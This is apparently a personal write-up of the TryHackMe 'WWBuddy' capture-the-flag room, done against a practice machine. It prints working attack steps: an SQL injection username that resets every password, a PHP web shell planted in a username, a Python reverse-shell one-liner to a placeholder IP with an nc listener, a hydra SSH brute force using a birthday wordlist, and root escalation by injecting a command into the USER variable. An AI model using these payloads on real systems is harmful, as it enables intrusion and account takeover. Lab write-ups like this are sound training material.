---
created: 2026-10-21
tags:
  - note
  - journal
  - cyberStuff
title: WWBuddy
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-22T09:31:27.961Z
---
link:https://tryhackme.com/room/wwbuddy\
Desc:

```
World wide buddy is a site for making friends, but it's still unfinished and it has some security flaws.

Deploy the machine and find the flags hidden in the room!
```

scanning the machine with nmap we see that only basic ports are opened (22 and 80) nothing interesting

looking around the site we see that it is a messaging client for different users , where every user has a assigned uid , i tried to break into , trying to decode the structure of the uid but i didn't had any success.\
uid structure :

```

http://10.113.178.227/profile/?uid=5a82a975331cc23b6f63288462263b27
```

lets try some kind of sql injection:\
knowing that we can modify our username and password as we wish, with no restriction for any kind of payload using the `Edit Info` page we can try this hypothesis :\
we set or username to `admin' or 1=1 -- -`\
modify our password to something simple like `pass1234`\
we may modify all account passwords to pass1234

now we can log in into any account wr know using `pass1234`

the simgle account we know about rn is WWBuddy , so lets log in into it using pass1234\
and it works.

using this we discover users Roberto and Henry

lets log in into Roberto account using the same method , and it works , cool

we can see the following conversation between roberto and henry :

![](/images/blog-ul-meu/static/Pasted%20image%2020261021102618.png)

interesting , lets log in into Henry account.

![](/images/blog-ul-meu/static/Pasted%20image%2020261021102658.png)

using henry account we can access /admin subdomain , which was inaccessible from other account\
we see this :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022032539.png)\
ok intersting , we see that every account that tried tgo access /admin is here , maybe if we try here a php command injection we can can RCE

change Robert or any account username to a payload like :

```php
<?php system($_GT["cmd"]) ?>
```

try to access /admin from that account , then log in as henry and access /admin?cmd=ls\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022033650.png)\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022033735.png) and we have rce , cool\
now lets get a rev shell using this python payload:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

before doing the steps again start a listener with

```
nc -nlvp 4444
```

or any port u like , now redo the step with that payload and we should get a rev shell , cool\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022033933.png)\
we are www-data\
using `cat /etc/passwd ` we found the new girl username , jenny

```bash
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
wwbuddy:x:1000:1000:WWBuddy:/home/wwbuddy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
roberto:x:1001:1001::/home/roberto:/bin/sh
jenny:x:1002:1002::/home/jenny:/bin/sh
```

now we just have to find her b-day, cool\
enumerating the machine i found this profile.php file , maybe it is usefull later

```
<?php
require_once "../config.php";

session_start();
if(!(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true)){
  header('Location: /login');
}

$username = $country = $email = $birthday = $description = "";

$uid = $_GET["uid"];
$sql = "SELECT username, country, email, birthday, description FROM users WHERE id = ?";

if($stmt = mysqli_prepare($link, $sql)){
    mysqli_stmt_bind_param($stmt, "s", $param_id);
    $param_id = $uid;
    mysqli_stmt_execute($stmt);
    mysqli_stmt_store_result($stmt);
    mysqli_stmt_bind_result($stmt, $username, $country, $email, $birthday, $description);

    mysqli_stmt_fetch($stmt);

    if(mysqli_stmt_num_rows($stmt)==0){
        die("User could not be found");
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WWBuddy</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
    <link rel="stylesheet" href="/styles/profile.css">
</head>
<body>
  <?php include("../header.html"); ?>
  <div class="profilecontent">
    <div class="profcontent">
      <img class="profilePic2" src="../images/profile.jpg">
      <p class="profileName2"><?php echo htmlspecialchars($username); ?></p>
    </div>
    <div class="proinfo">
      <p><strong>Country:</strong><?php echo $country; ?></p>
      <p><strong>E-mail:</strong><?php echo $email; ?></p>
      <p><strong>Birthday:</strong><?php if($date = DateTime::createFromFormat('Y-m-d', $birthday)){echo $date->format('m/d/Y');} ?></p>
      <p><strong>Description:</strong><?php echo $description; ?></p>
    </div>
  </div>
  <div class="center"><a class="sendmessage" href="/?send=<?php echo $uid ?>">Send me a message</a></div>
  <?php include("../footer.html"); ?>
</body>
</html>$
```

and this /authenticate binary\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022035657.png)

and this password for roberto inside `/var/log/mysql/general.log` :

```
grep -Ri password 2>/dev/null
mysql/general.log:2020-07-25T14:41:25.299556Z	    8 ConnectAccess denied for user 'root'@'localhost' (using password: YES)
mysql/general.log:2020-07-25T14:41:25.309467Z	    9 ConnectAccess denied for user 'root'@'localhost' (using password: YES)
mysql/general.log:2020-07-25T14:41:25.317916Z	   10 ConnectAccess denied for user 'root'@'localhost' (using password: NO)
mysql/general.log:2020-07-25T15:01:40.143115Z	   12 PrepareSELECT id, username, password FROM users WHERE username = ?
mysql/general.log:2020-07-25T15:01:40.143760Z	   12 ExecuteSELECT id, username, password FROM users WHERE username = 'Roberto[REDACTED]'
mysql/general.log:2020-07-25T15:02:00.018975Z	   13 PrepareSELECT id, username, password FROM users WHERE username = ?
mysql/general.log:2020-07-25T15:02:00.019056Z	   13 ExecuteSELECT id, username, password FROM users WHERE username = 'Roberto'
installer/installer-journal.txt:Jul 24 19:13:35 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
installer/installer-journal.txt:Jul 24 19:13:36 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
installer/installer-journal.txt:Jul 24 19:19:40 ubuntu-server usermod[13715]: change user 'sshd' password
installer/installer-journal.txt:Jul 24 19:19:41 ubuntu-server chage[13720]: changed password expiry for sshd
installer/subiquity-debug.log:2020-07-24 19:14:54,523 DEBUG subiquity.controllers.identity:51 IdentityController.done next-screen user_spec={'hostname': 'wwbuddy', 'realname': 'WWBuddy', 'username': 'wwbuddy', 'password': '<REDACTED>'}
installer/subiquity-debug.log.1448:2020-07-24 19:14:54,523 DEBUG subiquity.controllers.identity:51 IdentityController.done next-screen user_spec={'hostname': 'wwbuddy', 'realname': 'WWBuddy', 'username': 'wwbuddy', 'password': '<REDACTED>'}
cloud-init.log:2020-07-24 19:30:13,841 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'wwbuddy', '--comment', 'WWBuddy', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
cloud-init.log:2020-07-24 19:31:06,756 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-24 19:31:06,758 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-24 19:31:06,759 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/543c2fb5-9a15-49e6-9fb0-700c602d0403/sem/config_set_passwords - wb: [644] 25 bytes
cloud-init.log:2020-07-24 19:31:06,761 - helpers.py[DEBUG]: Running config-set-passwords using lock (<FileLock using file '/var/lib/cloud/instances/543c2fb5-9a15-49e6-9fb0-700c602d0403/sem/config_set_passwords'>)
cloud-init.log:2020-07-24 19:31:06,764 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
cloud-init.log:2020-07-24 19:31:06,876 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
cloud-init.log:2020-07-24 19:31:06,877 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
cloud-init.log:2020-07-24 19:49:49,330 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-24 19:49:49,330 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-24 19:49:49,330 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-24 19:49:49,330 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-24 19:51:10,972 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-24 19:51:10,972 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-24 19:51:10,972 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-24 19:51:10,972 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-24 22:49:14,090 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-24 22:49:14,090 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-24 22:49:14,090 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-24 22:49:14,090 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-25 13:21:55,204 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-25 13:21:55,205 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-25 13:21:55,205 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-25 13:21:55,205 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-27 20:45:26,821 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-27 20:45:26,821 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-27 20:45:26,821 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-27 20:45:26,821 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-28 03:19:18,648 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-28 03:19:18,648 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-28 03:19:18,648 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-28 03:19:18,648 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-28 17:21:38,351 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-28 17:21:38,351 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-28 17:21:38,351 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-28 17:21:38,351 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-29 01:46:54,162 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-29 01:46:54,162 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-29 01:46:54,162 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-29 01:46:54,162 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2020-07-29 03:13:56,658 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2020-07-29 03:13:56,659 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2020-07-29 03:13:56,659 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2020-07-29 03:13:56,659 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
cloud-init.log:2026-10-22 07:05:01,846 - stages.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
cloud-init.log:2026-10-22 07:05:01,847 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
cloud-init.log:2026-10-22 07:05:01,847 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
cloud-init.log:2026-10-22 07:05:01,847 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
bootstrap.log:Shadow passwords are now on.
```

we can now ssh into Roberto , and got the first flag\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022041213.png)\
translate the message from portugase\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022041401.png)\
now , using the message , and the date the file was created , we can create a wordlist for jenny account knowing the format for the birthday is dd/mm/yyyy\
![](/images/blog-ul-meu/static/Pasted%20image%2020261022041508.png)\
wordlist:

```bash
┌──(k㉿kali)-[~]
└─ hydra -l jenny -P wordlist ssh://10.113.158.10 -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-22 04:17:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 32 login tries (l:1/p:32), ~2 tries per task
[DATA] attacking ssh://10.113.158.10:22/
[22][ssh] host: 10.113.158.10   login: jenny   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-22 04:17:20

```

the wordlist :

```
08/01/1994
08/02/1994
08/03/1994
08/04/1994
08/05/1994
08/06/1994
08/07/1994
08/08/1994
08/09/1994
08/10/1994
07/28/1994
07/29/1994
07/30/1994
07/31/1994
07/32/1994
08/11/1994
08/01/1995
08/02/1995
08/03/1995
08/04/1995
08/05/1995
08/06/1995
08/07/1995
08/08/1995
08/09/1995
08/10/1995
08/11/1995
07/28/1995
07/29/1995
07/30/1995
07/31/1995
07/32/1995
```

now that we found jenny pass , we can log in into it using

```bash
ssh jenny@<YOUR_IP>
```

inside this account we can examine better that authenticate binary we found earlier , if we run it as jenny we get the message that **u are now a developer** , and educated guess can tell as that the binary does something with our USER variable , which is user modifiable , so we can try this approach:

```bash
jenny@wwbuddy:~$ echo $USER
jenny
jenny@wwbuddy:~$ export USER="jenny; bash"
jenny@wwbuddy:~$ authenticate
root@wwbuddy:~# cd /root
root@wwbuddy:/root# ls
root.txt
root@wwbuddy:/root# cat root.txt
```

basicaly , the authenticate binary is run by root, and we spawn a shell using it as root , and we get the last flag , also the first flag is inside the source code of http://\<YOUR\_IP>/admin/index.php
